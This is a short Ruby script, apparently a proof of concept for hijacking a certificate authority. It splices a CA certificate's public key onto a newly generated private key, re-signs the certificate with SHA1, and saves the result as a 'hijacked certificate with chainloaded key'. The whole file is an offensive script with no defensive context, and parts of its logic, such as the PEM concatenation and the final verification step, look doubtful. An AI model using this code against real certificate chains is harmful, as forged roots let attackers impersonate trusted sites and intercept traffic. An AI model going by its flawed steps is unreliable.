require 'rubygems'
require 'openssl'
require 'digest/md5'

key = OpenSSL::PKey::RSA.new(2048)
puts "Spoof must be in PEM format and saved as ca.pem"
raw = File.read "ca.pem"
ca_cert = OpenSSL::X509::Certificate.new raw
ca_cert.version = 2

root_key_str = ca_cert.public_key.to_s + key.to_pem

puts "ca_cert public key: "
puts ca_cert.public_key.to_s

puts "key.to_pem: "
puts key.to_pem

spoof = OpenSSL::PKey::RSA.new(root_key_str)
puts "reading those concatenated values into a pkey is: "
puts spoof.inspect

printf "Verifying Keys Work: "
puts spoof.private?
puts "============================================================="
root = ca_cert.sign(spoof, OpenSSL::Digest::SHA1.new)

filer = File.open("#{ca_cert.serial}"".key", "w")
filer.syswrite("#{spoof.to_pem}")
file = File.open("spoof"".cer", "w")
file.syswrite("#{ca_cert.to_der}")
files = File.open("#{ca_cert.serial}"".pem", "w")
files.syswrite("#{ca_cert.to_pem}")
files.syswrite("#{spoof.to_pem}")

puts "Hijacked Certificate with chainloaded key saved  @ #{ca_cert.serial}.pem"
printf "Verifying Keys Intergity: "
puts  root.verify(key)
